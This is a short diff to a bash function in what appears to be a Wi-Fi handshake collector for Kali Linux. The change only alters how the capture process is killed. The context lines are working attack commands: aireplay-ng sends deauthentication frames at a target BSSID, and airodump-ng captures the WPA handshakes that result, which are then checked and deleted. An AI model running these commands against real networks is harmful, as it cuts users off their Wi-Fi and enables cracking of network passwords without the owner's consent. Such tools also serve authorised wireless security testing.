@@ -117,8 +117,9 @@ active() {
           iwconfig $interface channel $Channel
           aireplay-ng -a $BSSID -0 5 $interface &
           airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null &
+          pid=`echo $!`
           sleep 20 
-          kill $!
+          kill -9 $pid
           checkHandshakes
           rm /home/kali/hscollector/shakes-01.* >/dev/null
           
